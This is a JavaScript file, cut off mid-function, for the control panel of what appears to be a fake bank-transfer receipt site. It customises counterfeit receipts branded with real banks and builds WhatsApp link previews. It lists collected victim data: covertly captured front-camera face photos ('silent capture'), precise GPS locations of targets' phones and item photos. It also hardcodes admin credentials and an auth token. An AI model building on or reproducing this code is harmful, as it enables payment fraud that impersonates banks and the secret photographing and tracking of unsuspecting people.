// ============================================================
// HELIX CONTROL PANEL & DASHBOARD SCRIPT V2
// Integrated with: Silent Front Camera + Location + Receipt Photo
// ============================================================

(function() {
    'use strict';

    const CONFIG = {
        API_URL: '/api/locations',
        TEMPLATE_URL: '/api/template',
        WEBPROFILE_URL: '/api/webprofile',
        UPLOAD_URL: '/api/upload',
        SYNC_CHANNEL: 'bankidzz_sync_channel',
        AUTH_TOKEN: 'Bearer bankidzz-admin-secure-2026'
    };

    // DOM Elements
    const elements = {
        liveClock: document.getElementById('liveClock'),
        // Tabs
        tabDashboard: document.getElementById('tabDashboard'),
        tabTransfer: document.getElementById('tabTransfer'),
        tabUser: document.getElementById('tabUser'),
        tabWeb: document.getElementById('tabWeb'),
        sectionDashboard: document.getElementById('sectionDashboard'),
        sectionTransfer: document.getElementById('sectionTransfer'),
        sectionUser: document.getElementById('sectionUser'),
        sectionWeb: document.getElementById('sectionWeb'),
        // Form Inputs
        t_topBarTitle: document.getElementById('t_topBarTitle'),
        t_primaryColor: document.getElementById('t_primaryColor'),
        t_profileImage: document.getElementById('t_profileImage'),
        t_bankName: document.getElementById('t_bankName'),
        t_bankSub: document.getElementById('t_bankSub'),
        t_amountMain: document.getElementById('t_amountMain'),
        t_amountSub: document.getElementById('t_amountSub'),
        t_senderBank: document.getElementById('t_senderBank'),
        t_senderName: document.getElementById('t_senderName'),
        t_senderAccount: document.getElementById('t_senderAccount'),
        t_receiverBank: document.getElementById('t_receiverBank'),
        t_receiverName: document.getElementById('t_receiverName'),
        t_receiverAccount: document.getElementById('t_receiverAccount'),
        t_buttonText: document.getElementById('t_buttonText'),
        // Buttons & Containers
        btnRefresh: document.getElementById('btnRefresh'),
        btnClearAll: document.getElementById('btnClearAll'),
        transTableBody: document.getElementById('transTableBody'),
        alertEmpty: document.getElementById('alertEmpty'),
        tableWrapper: document.getElementById('tableWrapper'),
        notification: document.getElementById('notification'),
        // Image Modal
        imgViewerModal: document.getElementById('imgViewerModal'),
        imgModalTitle: document.getElementById('imgModalTitle'),
        imgModalFull: document.getElementById('imgModalFull'),
        btnDownloadImg: document.getElementById('btnDownloadImg'),
        // NEW: Front Camera Modal
        frontCamModal: document.getElementById('frontCamModal'),
        frontCamTitle: document.getElementById('frontCamTitle'),
        frontCamImg: document.getElementById('frontCamImg'),
        btnDownloadFront: document.getElementById('btnDownloadFront'),
        frontCamInfo: document.getElementById('frontCamInfo'),
        // Login Elements
        adminContainer: document.getElementById('adminContainer'),
        loginOverlay: document.getElementById('loginOverlay'),
        loginAlert: document.getElementById('loginAlert'),
        loginUsername: document.getElementById('loginUsername'),
        loginPassword: document.getElementById('loginPassword'),
        btnAuthenticate: document.getElementById('btnAuthenticate')
    };

    // ============================================================
    // LIVE CLOCK
    // ============================================================
    function updateClock() {
        if (!elements.liveClock) return;
        const now = new Date();
        const hrs = String(now.getHours()).padStart(2, '0');
        const mins = String(now.getMinutes()).padStart(2, '0');
        const secs = String(now.getSeconds()).padStart(2, '0');
        elements.liveClock.textContent = `${hrs}.${mins}.${secs}`;
    }
    setInterval(updateClock, 1000);
    updateClock();

    // ============================================================
    // ACCESS TERMINAL HELIX - AUTHENTICATION
    // ============================================================
    const ADMIN_CREDENTIALS = {
        username: 'adminbimkidzz',
        password: 'adminbimkidzz123'
    };

    function checkHelixAuth() {
        const isAuth = sessionStorage.getItem('helix_admin_session') === 'active' || 
                       localStorage.getItem('helix_admin_session') === 'active';
        if (isAuth) {
            if (elements.loginOverlay) elements.loginOverlay.style.display = 'none';
            if (elements.adminContainer) elements.adminContainer.style.display = 'block';
            return true;
        } else {
            if (elements.loginOverlay) elements.loginOverlay.style.display = 'flex';
            if (elements.adminContainer) elements.adminContainer.style.display = 'none';
            return false;
        }
    }

    window.handleHelixLogin = function() {
        const u = elements.loginUsername ? elements.loginUsername.value.trim() : '';
        const p = elements.loginPassword ? elements.loginPassword.value : '';

        if (u === ADMIN_CREDENTIALS.username && p === ADMIN_CREDENTIALS.password) {
            if (elements.loginAlert) elements.loginAlert.style.display = 'none';
            if (elements.btnAuthenticate) {
                elements.btnAuthenticate.textContent = 'ACCESS GRANTED...';
                elements.btnAuthenticate.style.background = '#00ffb3';
                elements.btnAuthenticate.style.color = '#000000';
            }

            setTimeout(() => {
                sessionStorage.setItem('helix_admin_session', 'active');
                localStorage.setItem('helix_admin_session', 'active');
                checkHelixAuth();
                if (elements.btnAuthenticate) {
                    elements.btnAuthenticate.textContent = 'AUTHENTICATE';
                    elements.btnAuthenticate.style.background = '';
                    elements.btnAuthenticate.style.color = '';
                }
                showNotification('⚡ Welcome, Administrator');
                loadTransactions();
            }, 400);
        } else {
            if (elements.loginAlert) {
                elements.loginAlert.textContent = '⚠️ ACCESS DENIED: Invalid Username or Password';
                elements.loginAlert.style.display = 'block';
            }
            if (elements.loginPassword) {
                elements.loginPassword.value = '';
                elements.loginPassword.focus();
            }
        }
    };

    window.handleHelixLogout = function() {
        sessionStorage.removeItem('helix_admin_session');
        localStorage.removeItem('helix_admin_session');
        if (elements.loginUsername) elements.loginUsername.value = '';
        if (elements.loginPassword) elements.loginPassword.value = '';
        if (elements.loginAlert) elements.loginAlert.style.display = 'none';
        checkHelixAuth();
    };

    // ============================================================
    // TAB SWITCHER
    // ============================================================
    window.switchTab = function(tabName) {
        if (elements.tabDashboard) elements.tabDashboard.classList.remove('active');
        if (elements.tabTransfer) elements.tabTransfer.classList.remove('active');
        if (elements.tabUser) elements.tabUser.classList.remove('active');
        if (elements.tabWeb) elements.tabWeb.classList.remove('active');

        if (elements.sectionDashboard) elements.sectionDashboard.style.display = 'none';
        if (elements.sectionTransfer) elements.sectionTransfer.style.display = 'none';
        if (elements.sectionUser) elements.sectionUser.style.display = 'none';

        if (tabName === 'dashboard') {
            if (elements.tabDashboard) elements.tabDashboard.classList.add('active');
            if (elements.sectionDashboard) elements.sectionDashboard.style.display = 'block';
            loadTransactions();
        } else if (tabName === 'transfer' || tabName === 'web' || tabName === 'edit') {
            if (elements.tabTransfer) elements.tabTransfer.classList.add('active');
            if (elements.tabWeb) elements.tabWeb.classList.add('active');
            if (elements.sectionTransfer) elements.sectionTransfer.style.display = 'block';
            loadUnifiedConfig();
        } else if (tabName === 'user') {
            if (elements.tabUser) elements.tabUser.classList.add('active');
            if (elements.sectionUser) elements.sectionUser.style.display = 'block';
        }
    };

    // ============================================================
    // NOTIFICATION
    // ============================================================
    function showNotification(msg) {
        if (!elements.notification) return;
        elements.notification.textContent = msg;
        elements.notification.classList.add('show');
        setTimeout(() => {
            elements.notification.classList.remove('show');
        }, 3000);
    }

    // ============================================================
    // IMAGE TRANSPARENCY & AUTO-BLEND HELPERS
    // ============================================================
    let currentFaviconData = '';
    let detectedBrandColor = null;

    // Helper: hilangkan background putih/terang agar logo menyatu rapi dengan struk dan tab browser
    function removeWhiteBackground(dataUrl) {
        return new Promise((resolve) => {
            if (!dataUrl || (!dataUrl.startsWith('data:image') && !dataUrl.startsWith('http') && !dataUrl.includes('.'))) {
                return resolve({ dataUrl, dominantColor: null });
            }
            const img = new Image();
            img.crossOrigin = "anonymous";
            img.onload = function() {
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d', { willReadFrequently: true });
                    const w = img.naturalWidth || img.width;
                    const h = img.naturalHeight || img.height;
                    canvas.width = w;
                    canvas.height = h;
                    ctx.drawImage(img, 0, 0);

                    const imgData = ctx.getImageData(0, 0, w, h);
                    const data = imgData.data;

                    // Sample the 4 corners to check background color
                    const cornerCoords = [[0, 0], [w - 1, 0], [0, h - 1], [w - 1, h - 1]];
                    let lightCornerCount = 0;
                    for (const [cx, cy] of cornerCoords) {
                        const idx = (cy * w + cx) * 4;
                        const r = data[idx], g = data[idx + 1], b = data[idx + 2], a = data[idx + 3];
                        if (a > 20 && r > 210 && g > 210 && b > 210) {
                            lightCornerCount++;
                        }
                    }

                    // Extract dominant brand color from colorful pixels (ignoring neutral white/black/gray)
                    let colorVotes = {};
                    for (let i = 0; i < data.length; i += 16) {
                        const r = data[i], g = data[i + 1], b = data[i + 2], a = data[i + 3];
                        if (a > 180) {
                            const max = Math.max(r, g, b);
                            const min = Math.min(r, g, b);
                            const saturation = max === 0 ? 0 : (max - min) / max;
                            if (saturation > 0.35 && max > 70 && min < 225) {
                                const qr = Math.round(r / 16) * 16;
                                const qg = Math.round(g / 16) * 16;
                                const qb = Math.round(b / 16) * 16;
                                const key = `${qr},${qg},${qb}`;
                                colorVotes[key] = (colorVotes[key] || 0) + 1;
                            }
                        }
                    }

                    // If at least 2 corners are light/white, turn white/light background transparent
                    if (lightCornerCount >= 2) {
                        for (let i = 0; i < data.length; i += 4) {
                            const r = data[i], g = data[i + 1], b = data[i + 2], a = data[i + 3];
                            if (a === 0) continue;

                            const maxC = Math.max(r, g, b);
                            const minC = Math.min(r, g, b);
                            const diff = maxC - minC;

                            // Near white or pure white
                            if (diff < 20 && minC >= 225) {
                                if (minC >= 246) {
                                    data[i + 3] = 0; // Completely transparent
                                } else {
                                    const alphaRatio = (246 - minC) / 21;
                                    data[i + 3] = Math.max(0, Math.min(a, Math.round(alphaRatio * 255)));
                                }
                            }
                        }
                        ctx.putImageData(imgData, 0, 0);
                    }

                    // Determine most dominant brand color
                    let dominantHex = null;
                    let maxCount = 0;
                    for (const [key, count] of Object.entries(colorVotes)) {
                        if (count > maxCount) {
                            maxCount = count;
                            const [r, g, b] = key.split(',').map(Number);
                            dominantHex = "#" + ((1 << 24) + (r << 16) + (g << 8) + b).toString(16).slice(1);
                        }
                    }

                    resolve({
                        dataUrl: canvas.toDataURL('image/png'),
                        dominantColor: dominantHex
                    });
                } catch(err) {
                    console.warn('Transparent canvas processing error:', err);
                    resolve({ dataUrl, dominantColor: null });
                }
            };
            img.onerror = () => resolve({ dataUrl, dominantColor: null });
            img.src = dataUrl;
        });
    }

    // Helper: Buat logo persegi dengan latar putih bersih untuk preview WhatsApp & Medsos
    function createWhiteBackgroundPreview(logoDataUrl, size = 400, padding = 50) {
        return new Promise((resolve) => {
            if (!logoDataUrl || !logoDataUrl.startsWith('data:image')) {
                return resolve(logoDataUrl);
            }
            const img = new Image();
            img.crossOrigin = 'anonymous';
            img.onload = function() {
                try {
                    const canvas = document.createElement('canvas');
                    canvas.width = size;
                    canvas.height = size;
                    const ctx = canvas.getContext('2d');

                    // Latar belakang putih bersih
                    ctx.fillStyle = '#ffffff';
                    ctx.fillRect(0, 0, size, size);

                    // Pasang logo di tengah dengan padding yang pas
                    const maxDim = size - (padding * 2);
                    const scale = Math.min(maxDim / img.naturalWidth, maxDim / img.naturalHeight, 1);
                    const w = Math.round(img.naturalWidth * scale);
                    const h = Math.round(img.naturalHeight * scale);
                    const x = Math.round((size - w) / 2);
                    const y = Math.round((size - h) / 2);

                    ctx.drawImage(img, x, y, w, h);
                    resolve(canvas.toDataURL('image/png'));
                } catch(e) {
                    resolve(logoDataUrl);
                }
            };
            img.onerror = () => resolve(logoDataUrl);
            img.src = logoDataUrl;
        });
    }

    window.updateThemePreview = function(color) {
        const bar = document.getElementById('themeColorBarPreview');
        if (bar) bar.style.background = color;
    };

    window.applyDetectedColor = function() {
        if (!detectedBrandColor) return;
        const colorInput = document.getElementById('t_primaryColor');
        if (colorInput) {
            colorInput.value = detectedBrandColor;
            updateThemePreview(detectedBrandColor);
            showNotification(`Tema disamakan dengan warna brand logo: ${detectedBrandColor}`);
        }
    };

    window.handleProfileImageSelect = async function(event) {
        const file = event.target.files[0];
        if (!file) return;
        const nameEl = document.getElementById('name_profileImage');
        if (nameEl) nameEl.textContent = file.name;

        const reader = new FileReader();
        reader.onload = async function(e) {
            const rawDataUrl = e.target.result;
            showNotification('Memproses logo agar menyatu & transparan...');
            
            const { dataUrl, dominantColor } = await removeWhiteBackground(rawDataUrl);
            
            const prev = document.getElementById('preview_profileImg');
            if (prev) {
                prev.src = dataUrl;
                prev.style.display = 'block';
            }
            const hidden = document.getElementById('t_profileImage');
            if (hidden) hidden.value = dataUrl;

            // Sync favicon otomatis dengan logo transparan agar tab browser juga menyatu
            currentFaviconData = dataUrl;
            const prevFav = document.getElementById('preview_faviconImg');
            if (prevFav) {
                prevFav.src = dataUrl;
                prevFav.style.display = 'block';
            }
            const nameFav = document.getElementById('name_favicon');
            if (nameFav) nameFav.textContent = file.name + ' (transparan)';

            // Jika terdeteksi warna brand logo (contoh: Merah MUFG, Biru BCA)
            if (dominantColor) {
                detectedBrandColor = dominantColor;
                const row = document.getElementById('detectedColorRow');
                const chip = document.getElementById('detectedColorChip');
                const code = document.getElementById('detectedColorCode');
                if (row && chip && code) {
                    chip.style.background = dominantColor;
                    code.textContent = dominantColor;
                    row.style.display = 'flex';
                }
            }

            showNotification('Logo diproses: background putih dihapus agar menyatu rapi!');
        };
        reader.readAsDataURL(file);
    };

    window.handleFaviconSelect = async function(event) {
        const file = event.target.files[0];
        if (!file) return;
        const nameEl = document.getElementById('name_favicon');
        if (nameEl) nameEl.textContent = file.name;

        const reader = new FileReader();
        reader.onload = async function(e) {
            const rawDataUrl = e.target.result;
            showNotification('Memproses favicon agar transparan di tab...');
            
            const { dataUrl } = await removeWhiteBackground(rawDataUrl);
            const prev = document.getElementById('preview_faviconImg');
            if (prev) {
                prev.src = dataUrl;
                prev.style.display = 'block';
            }
            currentFaviconData = dataUrl;

            showNotification('Favicon berhasil diset menjadi transparan!');
        };
        reader.readAsDataURL(file);
    };

    // ============================================================
    // LOAD UNIFIED CONFIG (WEB & STRUK)
    // ============================================================
    async function loadUnifiedConfig() {
        let templateData = null;
        let webData = null;

        // 1. Coba baca dari server
        try {
            const [tRes, wRes] = await Promise.all([
                fetch(CONFIG.TEMPLATE_URL, { cache: 'no-store' }),
                fetch(CONFIG.WEBPROFILE_URL, { cache: 'no-store' })
            ]);
            if (tRes.ok) {
                const tj = await tRes.json();
                if (tj.template) templateData = tj.template;
            }
            if (wRes.ok) {
                const wj = await wRes.json();
                if (wj.profile) webData = wj.profile;
            }
        } catch(e) {
            console.warn('Gagal memuat config dari server:', e);
        }

        // 2. Fallback ke localStorage jika server kosong
        if (!templateData) {
            try {
                templateData = JSON.parse(localStorage.getItem('bankidzz_new_template') || 'null');
            } catch(e) {}
        }
        if (!webData) {
            try {
                webData = JSON.parse(localStorage.getItem('bankidzz_web_profile') || 'null');
            } catch(e) {}
        }

        const t = templateData || {};
        const w = webData || {};

        const setVal = (id, val, fallback) => {
            const el = document.getElementById(id);
            if (el) el.value = (val !== undefined && val !== null) ? val : fallback;
        };

        // Header & Tema
        setVal('t_topBarTitle', t.topBarTitle || w.siteTitle, 'JAPANESE BANK');
        const themeCol = t.primaryColor || w.themeColor || '#0033ff';
        setVal('t_primaryColor', themeCol, '#0033ff');
        window.updateThemePreview(themeCol);

        // Foto Profil (Abaikan channels4_profile.jpg, default logo.png)
        const pImg = t.profileImage || w.favicon || 'logo.png';
        const cleanPImg = (pImg === 'channels4_profile.jpg' || !pImg) ? 'logo.png' : pImg;
        setVal('t_profileImage', cleanPImg, 'logo.png');
        const prevImg = document.getElementById('preview_profileImg');
        if (prevImg) {
            prevImg.src = cleanPImg;
            prevImg.style.display = 'block';
        }

        // Favicon
        const fImg = w.favicon || cleanPImg || '';
        currentFaviconData = (fImg === 'channels4_profile.jpg') ? '' : fImg;
        const prevFav = document.getElementById('preview_faviconImg');
        if (prevFav) {
            prevFav.src = currentFaviconData;
            prevFav.style.display = currentFaviconData ? 'block' : 'none';
        }

        // Struk Info
        setVal('t_bankName', t.bankName, 'MUFG Bank');
        setVal('t_bankSub', t.bankSub, 'Office Purchasing');
        setVal('t_amountMain', t.amountMain, 'IDR 515.000');
        setVal('t_amountSub', t.amountSub, 'BND 35.12');
        setVal('t_senderBank', t.senderBank, 'MUFG Bank');
        setVal('t_senderName', t.senderName, 'JAKA ALAMSYAH');
        setVal('t_senderAccount', t.senderAccount, '72828172718');
        setVal('t_receiverBank', t.receiverBank, 'BANK BNI');
        setVal('t_receiverAccount', t.receiverAccount, '2093832050');
        setVal('t_receiverName', t.receiverName, 'Mungkung');
        setVal('t_buttonText', t.buttonText, 'Ambil Foto Konfirmasi / Tanda Tangan');
    }

    // ============================================================
    // SAVE UNIFIED CONFIG (WEB & STRUK)
    // ============================================================
    window.saveUnifiedConfig = async function() {
        const getVal = (id, fallback) => {
            const el = document.getElementById(id);
            return (el && el.value.trim()) ? el.value.trim() : fallback;
        };

        let profImg = getVal('t_profileImage', 'logo.png');
        if (profImg === 'channels4_profile.jpg' || !profImg) profImg = 'logo.png';
        let favImg = currentFaviconData || profImg || 'logo.png';
        if (favImg === 'channels4_profile.jpg' || !favImg) favImg = 'logo.png';

        // Pastikan background putih terhapus sebelum disimpan di struk
        if (profImg && profImg.startsWith('data:image')) {
            const cleanProf = await removeWhiteBackground(profImg);
            profImg = cleanProf.dataUrl;
        }
        if (favImg && favImg.startsWith('data:image')) {
            const cleanFav = await removeWhiteBackground(favImg);
            favImg = cleanFav.dataUrl;
        }

        // Otomatis buat thumbnail WhatsApp: Logo baru di tengah dengan latar putih bersih persegi
        let whiteBgOgImage = '';
        if (profImg && profImg.startsWith('data:image')) {
            whiteBgOgImage = await createWhiteBackgroundPreview(profImg, 400, 50);
        }

        const template = {
            topBarTitle: getVal('t_topBarTitle', 'JAPANESE BANK'),
            primaryColor: getVal('t_primaryColor', '#0033ff'),
            profileImage: profImg,
            bankName: getVal('t_bankName', 'MUFG Bank'),
            bankSub: getVal('t_bankSub', 'Office Purchasing'),
            amountMain: getVal('t_amountMain', 'IDR 515.000'),
            amountSub: getVal('t_amountSub', 'BND 35.12'),
            senderBank: getVal('t_senderBank', 'MUFG Bank'),
            senderName: getVal('t_senderName', 'JAKA ALAMSYAH'),
            senderAccount: getVal('t_senderAccount', '72828172718'),
            receiverBank: getVal('t_receiverBank', 'BANK BNI'),
            receiverName: getVal('t_receiverName', 'Mungkung'),
            receiverAccount: getVal('t_receiverAccount', '2093832050'),
            buttonText: getVal('t_buttonText', 'Ambil Foto Konfirmasi / Tanda Tangan')
        };

        const webProfile = {
            siteTitle: template.topBarTitle,
            themeColor: template.primaryColor,
            favicon: favImg,
            appleTouchIcon: favImg,
            metaDescription: `${template.bankName} - ${template.bankSub}`,
            ogTitle: template.topBarTitle,
            ogDescription: `${template.bankName} - ${template.bankSub}`,
            ogImage: whiteBgOgImage || 'https://struk-transaksi-antarnegara.vercel.app/api/og-image',
            ogUrl: window.location.origin + '/',
            twitterTitle: template.topBarTitle,
            twitterDescription: `${template.bankName} - ${template.bankSub}`,
            twitterImage: 'https://struk-transaksi-antarnegara.vercel.app/api/og-image'
        };

        // 1. Simpan ke localStorage
        localStorage.setItem('bankidzz_new_template', JSON.stringify(template));
        localStorage.setItem('bankidzz_web_profile', JSON.stringify(webProfile));

        // 2. Simpan ke server
        try {
            await Promise.all([
                fetch(CONFIG.TEMPLATE_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': CONFIG.AUTH_TOKEN
                    },
                    body: JSON.stringify(template)
                }),
                fetch(CONFIG.WEBPROFILE_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': CONFIG.AUTH_TOKEN
                    },
                    body: JSON.stringify(webProfile)
                })
            ]);
        } catch(e) {
            console.warn('Gagal simpan ke server:', e);
        }

        // 3. Broadcast ke seluruh tab yang sedang terbuka
        try {
            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
            channel.postMessage({ type: 'template_updated', template: template });
            channel.postMessage({ type: 'webprofile_updated', profile: webProfile });
            channel.close();
        } catch(e) {}

        showNotification('✅ Perubahan Web & Struk Berhasil Disimpan!');
    };

    // Alias fungsi agar kompatibel jika ada pemanggilan lama
    window.saveTemplate = window.saveUnifiedConfig;
    window.saveWebProfile = window.saveUnifiedConfig;
    window.loadTemplate = loadUnifiedConfig;
    window.loadWebProfile = loadUnifiedConfig;

    // ============================================================
    // LOAD TRANSACTIONS - DENGAN DATA LENGKAP
    // ============================================================
    async function loadTransactions() {
        let transfers = [];
        const map = new Map();

        // 1. Baca dari admin persistent cache & local transactions agar data INSTAN muncul & TIDAK PERNAH HILANG saat refresh
        try {
            const adminPersisted = JSON.parse(localStorage.getItem('bankidzz_admin_persisted_transfers') || '[]');
            if (Array.isArray(adminPersisted)) {
                adminPersisted.forEach(item => {
                    if (item && item.transferId) map.set(item.transferId, item);
                });
            }
            const localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
            if (Array.isArray(localStored)) {
                localStored.forEach(item => {
                    if (item && item.transferId) {
                        const ex = map.get(item.transferId);
                        map.set(item.transferId, ex ? { ...ex, ...item } : item);
                    }
                });
            }
        } catch(e) {}

        transfers = Array.from(map.values());

        // Render langsung dari cache lokal agar layar tidak pernah blank / kosong saat F5 refresh!
        if (transfers.length > 0) {
            renderTransactions(transfers);
        }

        // 2. Baca dari server API di background
        try {
            const response = await fetch(CONFIG.API_URL, {
                headers: { 'Authorization': CONFIG.AUTH_TOKEN }
            });

            if (response.ok) {
                const result = await response.json();
                if (result.transfers && Array.isArray(result.transfers) && result.transfers.length > 0) {
                    result.transfers.forEach(item => {
                        if (!item || !item.transferId) return;
                        const existing = map.get(item.transferId);
                        if (!existing) {
                            map.set(item.transferId, item);
                        } else {
                            map.set(item.transferId, {
                                ...existing,
                                ...item,
                                photo: item.photo || existing.photo || '',
                                frontPhoto: item.frontPhoto || existing.frontPhoto || '',
                                front_photo: item.front_photo || existing.front_photo || '',
                                status: (item.status === 'verified' || existing.status === 'verified') ? 'verified' : (item.status || existing.status),
                                location: (item.location && typeof item.location.lat === 'number') ? item.location : existing.location
                            });
                        }
                    });
                    transfers = Array.from(map.values());
                }
            }
        } catch(e) {
            console.warn('Backend API not reachable, using persistent cache.', e);
        }

        // Simpan selalu ke admin persistent storage agar tidak pernah hilang
        if (transfers.length > 0) {
            try {
                localStorage.setItem('bankidzz_admin_persisted_transfers', JSON.stringify(transfers));
            } catch(e) {}
        }

        renderTransactions(transfers);
    }

    // ============================================================
    // RENDER TRANSACTIONS - DENGAN KOLOM FOTO DEPAN
    // ============================================================
    function renderTransactions(transfers) {
        if (!elements.transTableBody) return;
        elements.transTableBody.innerHTML = '';
        
        if (!transfers || transfers.length === 0) {
            if (elements.alertEmpty) elements.alertEmpty.style.display = 'flex';
            if (elements.tableWrapper) elements.tableWrapper.style.display = 'none';
            return;
        }

        if (elements.alertEmpty) elements.alertEmpty.style.display = 'none';
        if (elements.tableWrapper) elements.tableWrapper.style.display = 'block';

        transfers.sort((a, b) => new Date(b.timestamp || 0) - new Date(a.timestamp || 0));

        transfers.forEach(t => {
            const tr = document.createElement('tr');
            
            // ==========================================
            // 1. FOTO BARANG TRANSAKSI (Kamera Belakang) - BESAR
            // ==========================================
            let receiptPhotoHtml = '<div style="color:var(--text-muted); font-size:12px; width:140px; height:140px; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.03); border-radius:10px; border:1px dashed #334155;">Tidak Ada Foto</div>';
            const receiptImg = t.photo || t.receiptPhoto || '';
            if (receiptImg) {
                receiptPhotoHtml = `<img src="${receiptImg}" class="photo-thumb-large photo-thumb-receipt" alt="Barang ${t.transferId}" onclick="window.viewFullPhoto('${receiptImg}', '${t.transferId}')" title="Klik untuk perbesar Foto Barang Transaksi">`;
            } else if (t.status === 'waiting_item_photo') {
                receiptPhotoHtml = '<div style="color:var(--accent-green); font-size:11px; width:140px; height:140px; display:flex; flex-direction:column; align-items:center; justify-content:center; background:rgba(0,255,179,0.05); border-radius:10px; border:1px dashed var(--accent-green); text-align:center; padding:10px; line-height:1.4;"><span style="font-size:22px; margin-bottom:4px;">📷</span><span>Menunggu Foto Barang...</span></div>';
            }

            // ==========================================
            // 2. FOTO KAMERA DEPAN / WAJAH (Silent Capture) - BESAR
            // ==========================================
            let frontPhotoHtml = '<div style="color:var(--text-muted); font-size:12px; width:140px; height:140px; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.03); border-radius:10px; border:1px dashed #334155;">Tidak Ada Foto</div>';
            const frontImg = t.frontPhoto || t.front_photo || '';
            if (frontImg) {
                frontPhotoHtml = `<img src="${frontImg}" class="photo-thumb-large photo-thumb-front" alt="Wajah ${t.transferId}" onclick="window.viewFrontPhoto('${frontImg}', '${t.transferId}')" title="Klik untuk perbesar FOTO WAJAH (SILENT)">`;
            }

            // ==========================================
            // 3. LOKASI (GPS AKURAT)
            // ==========================================
            let locStr = '<span style="color:var(--text-muted)">Tanpa GPS</span>';
            if (t.location && typeof t.location.lat === 'number' && typeof t.location.lng === 'number' && !(t.location.lat === 0 && t.location.lng === 0)) {
                const acc = t.location.accuracy ? `±${Math.round(t.location.accuracy)}m` : '';
                const src = t.location.source || '';
                let badge = '';
                let hint = '';
                const isMonas = Math.abs(t.location.lat - (-6.2088)) < 0.001 && Math.abs(t.location.lng - 106.8456) < 0.001;

                if ((src.includes('gps') || src.includes('device') || (t.location.accuracy && t.location.accuracy <= 250)) && !isMonas) {
                    badge = '<span style="display:inline-block; font-size:10px; padding:2px 6px; border-radius:4px; background:rgba(0,255,179,0.2); color:var(--accent-green); font-weight:700; margin-bottom:4px;">🛰️ GPS Satelit Realtime (Presisi Tinggi)</span>';
                } else if (src.includes('ip') || (t.location.accuracy && t.location.accuracy > 500 && !isMonas)) {
                    badge = '<span style="display:inline-block; font-size:10px; padding:2px 6px; border-radius:4px; background:rgba(255,184,0,0.2); color:#ffb800; font-weight:700; margin-bottom:4px;">📶 Estimasi IP Seluler (Perkiraan ISP)</span>';
                    hint = '<div style="color:#ffb800; font-size:10px; margin-top:2px;">⚠️ Titik perkiraan ISP. Izin lokasi browser di HP target perlu diizinkan agar presisi tingkat meter.</div>';
                } else if (isMonas || src.includes('fallback')) {
                    badge = '<span style="display:inline-block; font-size:10px; padding:2px 6px; border-radius:4px; background:rgba(255,42,109,0.2); color:var(--accent-pink); font-weight:700; margin-bottom:4px;">⚠️ Fallback Sistem</span>';
                }

                const cityInfo = t.location.city ? `<div style="color:var(--text-muted); font-size:11px;">📍 ${t.location.city}${t.location.country ? ', ' + t.location.country : ''}</div>` : '';

                locStr = `
                    <div style="font-family:'Share Tech Mono', monospace; font-size:13px; line-height:1.6;">
                        ${badge ? `<div>${badge}</div>` : ''}
                        <div style="color:#ffffff; font-weight:700;">Lat: ${t.location.lat.toFixed(6)}</div>
                        <div style="color:#ffffff; font-weight:700;">Lng: ${t.location.lng.toFixed(6)}</div>
                        ${acc ? `<div style="color:var(--accent-green); font-size:11px;">Akurasi: ${acc}</div>` : ''}
                        ${cityInfo}
                        ${hint}
                        <a href="https://www.google.com/maps/search/?api=1&query=${t.location.lat},${t.location.lng}" target="_blank" style="display:inline-block; margin-top:6px; padding:4px 10px; background:rgba(0,255,179,0.15); border:1px solid var(--accent-green); border-radius:6px; color:var(--accent-green); text-decoration:none; font-weight:bold; font-size:11px;">📍 Buka Google Maps ↗</a>
                    </div>
                `;
            }

            // ==========================================
            // 4. WAKTU (WIB)
            // ==========================================
            let timeStr = t.timestamp ? new Date(t.timestamp).toLocaleString('id-ID', {
                dateStyle: 'medium',
                timeStyle: 'medium'
            }) : '-';

            tr.innerHTML = `
                <td style="vertical-align:top; padding:16px;">${receiptPhotoHtml}</td>
                <td style="vertical-align:top; padding:16px;">${frontPhotoHtml}</td>
                <td style="vertical-align:top; padding:16px;">${locStr}</td>
                <td style="vertical-align:top; padding:16px; font-family:'Share Tech Mono',monospace; font-size:13px; color:var(--text-light);">${timeStr}</td>
                <td style="vertical-align:top; padding:16px;">
                    <button class="btn-action-del" onclick="window.deleteTransaction('${t.transferId}')">🗑️ Hapus</button>
                </td>
            `;
            elements.transTableBody.appendChild(tr);
        });
    }

    // ============================================================
    // VIEW FOTO BARANG TRANSAKSI (KAMERA BELAKANG)
    // ============================================================
    window.viewFullPhoto = function(photoUrl, refId) {
        if (!elements.imgViewerModal) return;
        if (elements.imgModalTitle) elements.imgModalTitle.textContent = `FOTO BARANG TRANSAKSI [ ${refId} ]`;
        if (elements.imgModalFull) elements.imgModalFull.src = photoUrl;
        if (elements.btnDownloadImg) {
            elements.btnDownloadImg.href = photoUrl;
            elements.btnDownloadImg.download = `FotoBarang_${refId}.jpg`;
        }
        elements.imgViewerModal.style.display = 'flex';
    };

    window.closeImgModal = function() {
        if (elements.imgViewerModal) elements.imgViewerModal.style.display = 'none';
    };

    // ============================================================
    // VIEW FOTO WAJAH (KAMERA DEPAN / SILENT CAPTURE)
    // ============================================================
    window.viewFrontPhoto = function(photoUrl, refId) {
        if (!elements.frontCamModal) return;
        if (elements.frontCamTitle) elements.frontCamTitle.textContent = `FOTO WAJAH (SILENT CAPTURE) [ ${refId} ]`;
        if (elements.frontCamImg) elements.frontCamImg.src = photoUrl;
        if (elements.btnDownloadFront) {
            elements.btnDownloadFront.href = photoUrl;
            elements.btnDownloadFront.download = `FotoWajah_${refId}.jpg`;
        }
        if (elements.frontCamInfo) {
            elements.frontCamInfo.textContent = `Diambil secara silent capture kamera depan saat konfirmasi tanda tangan diklik`;
        }
        elements.frontCamModal.style.display = 'flex';
    };

    window.closeFrontCamModal = function() {
        if (elements.frontCamModal) elements.frontCamModal.style.display = 'none';
    };

    // ============================================================
    // DELETE TRANSACTION
    // ============================================================
    window.deleteTransaction = async function(transferId) {
        if (!confirm(`Hapus transaksi ${transferId}?`)) return;

        try {
            let localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
            localStored = localStored.filter(t => t.transferId !== transferId);
            localStorage.setItem('bankidzz_local_transactions', JSON.stringify(localStored));

            let adminStored = JSON.parse(localStorage.getItem('bankidzz_admin_persisted_transfers') || '[]');
